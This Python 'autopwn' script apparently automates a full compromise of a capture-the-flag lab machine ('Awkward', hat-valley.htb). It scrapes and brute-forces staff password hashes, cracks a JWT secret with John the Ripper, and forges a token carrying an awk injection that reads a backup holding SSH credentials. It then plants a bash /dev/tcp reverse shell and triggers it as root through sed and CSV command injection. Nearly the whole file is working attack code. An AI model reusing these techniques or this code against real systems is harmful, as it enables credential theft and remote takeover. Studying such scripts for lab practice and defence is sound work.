#!/usr/bin/env python3

"""
Awkward Autopwn
---------------
Author: Marss
Date: 11 Dec, 2022
"""


import tarfile

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64encode
from binascii import hexlify
from hashlib import sha256
from json import loads
from jwt import encode, decode, InvalidTokenError, DecodeError, get_unverified_header
from jwt.utils import base64url_decode
from paramiko import SSHClient, AutoAddPolicy
from re import findall
from requests import Session, Request, get
from shutil import copyfileobj
from signal import signal, SIGINT
from subprocess import run
from sys import exit


# Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)


# Main class
class Exploit:

	def __init__(self, args):
		self.args = args

		self.wordlist_path = self.args.wordlist

		self.target_host = {
			'ip_address' : '10.10.11.185',
			'domain_url' : 'http://hat-valley.htb',
			'subdomain_url' : 'http://store.hat-valley.htb'
		}

		self.target_credentials = {
			'staff' : {},
			'ssh' : {}
		}

	def run(self):
		"""
		Exploit process:
		----------------
		(1) Web Scrapping in Javascript web file (app.js)
				* Extract Staff hashed credential from API route
				
				* Crack credential with Python (Brute force)
				
				* Hat Valley HR Login panel [Use of previous credentials]

		(2) Server Side Request Forgery (SSRF) in API [Hat Valley HR] *Direct*
				* Local Port Discovery

		(3) Local File Inclusion (LFI) with "awk" in API function [Hat Valley HR] by JWT token
				* Crack secret key of JWT token with JohnTheRipper

				* Extract credentials of Bean user
				
				* SSH Access [Reused Credentials]

		(4) Remote Code Execution (RCE) in Web subdomain with "sed" in purchaing process function
				* Access [User:guessing/Log enumeration, Password:Reused Credentials]
				
				* Pivoting to www-data user *Direct*
		
		(5) Remote Code Execution (RCE) with "mail" by Linux monitory tool "inotifywait"
				# Gain shell like Root user
		"""
		# (1)
		print('[*] Starting attack:')
		print('[*] Extracting staff credentials...')
		self.extract_staff_credential()
		print('[+] Credentials -> {}'.format(self.target_credentials['staff']))
		# (2, 3)
		print('[*] Craking JWT secret key...')
		self.jwt_key_cracking()
		print('[+] Secret key -> {}'.format(self.target_credentials['staff']['secret']))
		# (4)
		print('[*] Crafting JWT token and extracting SSH credentials...')
		self.extract_user_credential()
		print('[+] Credentials -> {}'.format(self.target_credentials['ssh']))
		# (5)
		print('[*] Sending inyection to activate script and RCE...')
		self.reverse_shell()

	def extract_staff_credential(self):

		try:
			with Session() as session:
				# Get username and password hash
				req = Request('GET', self.target_host['domain_url'] + '/api/staff-details')
				prepare_request = session.prepare_request(req)

				response = session.send(prepare_request)
				
				self.target_credentials['staff']['user'] = findall(r'"username":"(.*?)"', response.text)[1]
				self.target_credentials['staff']['pass'] = findall(r'"password":"(.*?)"', response.text)[1]

			# Cracking password
			self.password_cracking()

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def password_cracking(self):

		try:
			pass_finded = False

			# SHA256 Brute force attack
			with open(self.wordlist_path, 'rt', errors='replace') as wordlist: # errors='replace' (UnicodeDecodeError)
				for word in wordlist:
					word = word.strip('\n')
					word_hash = sha256(word.encode('utf-8')).hexdigest()
					
					if word_hash == self.target_credentials['staff']['pass']:
						self.target_credentials['staff']['pass'] = word
						pass_finded = True
						break

			if not pass_finded:
				exit('\n[!] User password is not found in the wordlist. Please try with another like rockyou.txt (recommended)')

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def jwt_key_cracking(self):

		try:
			with Session() as session:
				# Get token
				post_data = {
					'username' : self.target_credentials['staff']['user'],
					'password' : self.target_credentials['staff']['pass'],
				}

				req = Request('POST', self.target_host['domain_url'] + '/api/login',
					json=post_data)
				prepare_request = session.prepare_request(req)

				response = session.send(prepare_request)
				self.target_credentials['staff']['token'] = loads(response.text)['token']

			# Cracking secret key with John (recommended)
			token = self.target_credentials['staff']['token']
			self.target_credentials['staff']['secret'] = self.crack_with_john(token)

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def jwt_to_john(self, token: str) -> str:
		
		token_bytes = token.encode('ascii')
		parts = token_bytes.split(b'.')

		data = parts[0] + b'.' + parts[1]
		# Binary data to printable ASCII characters and
		# then to hexadecimal
		signature = hexlify(base64url_decode(parts[2]))
		
		return (data + b'#' + signature).decode('ascii')

	def crack_with_john(self, token: str) -> str:
		
		try:
			token = self.target_credentials['staff']['token']

			# Jwt2john
			hash_token = self.jwt_to_john(token)
			hash_token_file = 'hash_token'

			# Save token hash in file
			with open(hash_token_file, 'wt') as file:
				file.write(hash_token)

			# John the Ripper
			command = f'john --format=HMAC-SHA256 -w={self.wordlist_path} {hash_token_file}'
			john_output = run(command, capture_output=True, shell=True)
			
			try:
				hash_key = findall(r"\n(.*?)\s+", john_output.stdout.decode())[0]
			except IndexError:
				exit('\n[!] Secret key is not found in the wordlist. Please try with another like rockyou.txt (recommended)')
			
			return hash_key
		
		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def extract_user_credential(self):
		
		try:
			# Create malicious JWT
			token = self.target_credentials['staff']['token']
			secret = self.target_credentials['staff']['secret']
			payload = "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '/"

			malicious_jwt = self.create_malicious_jwt(token, secret, payload)
			
			# Get bean user credentials
			with Session() as session:
				target_url = self.target_host['domain_url'] + '/api/all-leave'
				cookies = {'token' : malicious_jwt}

				req = Request('GET', target_url, cookies=cookies)
				prepare_request = session.prepare_request(req)

				response = session.send(prepare_request, stream=True)
				
				# Save response in compressed file
				backup_file = 'backup.tar.gz'
				with open(backup_file, 'wb') as file:
					copyfileobj(response.raw, file)
				
				# Decompress tar.gz file of tar.gz file
				decompress_dir = './backup_dir/'
				with tarfile.open(backup_file, 'r:gz') as file:
					file.extractall('./backup_dir')

				with tarfile.open('./backup_dir/bean_backup.tar.gz', 'r:gz') as file:
					file.extractall('./backup_dir/backup_content')

				# Extract credentials
				with open('./backup_dir/backup_content/.config/xpad/content-DS1ZS1', 'rt') as file:
					data = file.read()

					self.target_credentials['ssh']['user'], \
					self.target_credentials['ssh']['pass'] = findall(r'HR SYSTEM.*\s(.*)\s(.*)', data)[0]

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def create_malicious_jwt(self, token: str, secret: str, lfi_payload: str) -> str:
		# Extract token headers
		headers = get_unverified_header(token)
		
		# Extract token payload and insert lfi payload
		payload = decode(token, options={'verify_signature' : False})
		payload['username'] = lfi_payload
		
		# Create new malicious jwt
		encode_jwt = encode(payload, secret, algorithm=headers['alg'])

		return encode_jwt

	def reverse_shell(self):
		
		try:
			# Init SSH Connection
			_user = self.target_credentials['ssh']['user'].split('.')[0]
			_pass = self.target_credentials['ssh']['pass']
			
			ssh_client = self.ssh_connection(_user, _pass)

			# Create workstation
			work_dir = f'/tmp/.{self.args.ip}'
			ssh_client.exec_command(f'mkdir -p {work_dir} && chmod o+w {work_dir}')

			# Create reverse shell and activate (to root)
			command = "echo \"#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/{}/{} 0>&1\" > {}/shell.sh" \
				.format(self.args.ip, self.args.port, work_dir)
			ssh_client.exec_command(command)

			command = "echo \"#!/bin/bash\n\necho \\\"\\\\\\\" --exec=\\\\\\\"\\!{}/shell.sh\\\\\\\" \\\" >> /var/www/private/leave_requests.csv\" > {}/activate.sh" \
				.format(work_dir, work_dir)
			ssh_client.exec_command(command)

			# Assign permisions
			ssh_client.exec_command(f'chmod +x {work_dir}/shell.sh {work_dir}/activate.sh')
			
			# Shop and Delete to RCE
			with Session() as session:

				# Encode authorization data
				data = f'admin:{_pass}'
				b64_data = b64encode(data.encode('ascii')).decode('ascii')

				headers = {'Authorization' : f'Basic {b64_data}'}

				user_temp = '92a0-9c1b-c33-3fe7'
				post_data = {
					'item' : 1,
					'user' : user_temp,
					'action' : 'add_item'
				}
				# Shop item
				req = Request('POST', self.target_host['subdomain_url'] + '/cart_actions.php',
					headers=headers,
					data=post_data)
				prepare_request = session.prepare_request(req)

				session.send(prepare_request)

				# Bypass access and modify vulnerable cart file
				original_file = '/var/www/store/cart/{}'.format(user_temp)
				backup_file = '/var/www/store/cart/{}.bak'.format(user_temp)
				
				command = f'cp {original_file} {backup_file}' \
						+ f'&& rm -f {original_file}' \
						+ f'&& mv {backup_file} {original_file}'
				ssh_client.exec_command(command)
				
				# Craft command (scaped characters)
				shell_path = work_dir + '/activate.sh'
				shell_path_esc = shell_path.replace('/', '\/')

				command = f"sed \"s/1/1' -e \\\"1e {shell_path_esc}\\\" {shell_path_esc} '/g\" {original_file} > data.tmp" \
						+ f'&& cat data.tmp > {original_file}' \
						+ f'&& rm data.tmp'
				ssh_client.exec_command(command)
				
				# Open port to receive the shell (user interaction)
				print("[*] Open port {} to receive root shell.".format(self.args.port))
				input("[*] Press a key to continue.")

				# Delete item and activate root shell
				payload = "1' -e \"1e {}/activate.sh\" {}/activate.sh '".format(work_dir, work_dir)
				
				post_data['item'] = payload
				post_data['action'] = 'delete_item'

				req = Request('POST', self.target_host['subdomain_url'] + '/cart_actions.php',
					headers=headers,
					data=post_data)
				prepare_request = session.prepare_request(req)

				session.send(prepare_request) # pwned!

			# Removing workstation
			print('[-] Removing workstation and files.')
			ssh_client.exec_command(f'rm -r {work_dir}')

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def ssh_connection(self, username: str, password: str):

		try:
			ssh_client = SSHClient()
			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'],
				port=22,
				username=username,
				password=password)

			return ssh_client

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))


# Main flow
if __name__ == '__main__':

	ascii_title = """
     /\       |        _. ._  _|    /\      _|_  _  ._       ._  
    /--\ \/\/ |< \/\/ (_| |  (_|   /--\ |_|  |_ (_) |_) \/\/ | |
                                                    |
                                                    	   by marss
	"""

	parser = ArgumentParser(
		formatter_class=RawDescriptionHelpFormatter,
		epilog="Example:\n\n  python3 autopwn.py -i 10.10.10.10 -p 5555 -w /usr/share/wordlists/rockyou.txt")

	parser.add_argument('-i', '--ip', type=str, required=True, help='Specified ip to receive the shell')
	parser.add_argument('-p', '--port', type=int, required=True, help='Specified port to receive the shell')
	parser.add_argument('-w', '--wordlist', type=str, required=True, help='Specified wordlist to cracking')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)
	exploit.run()	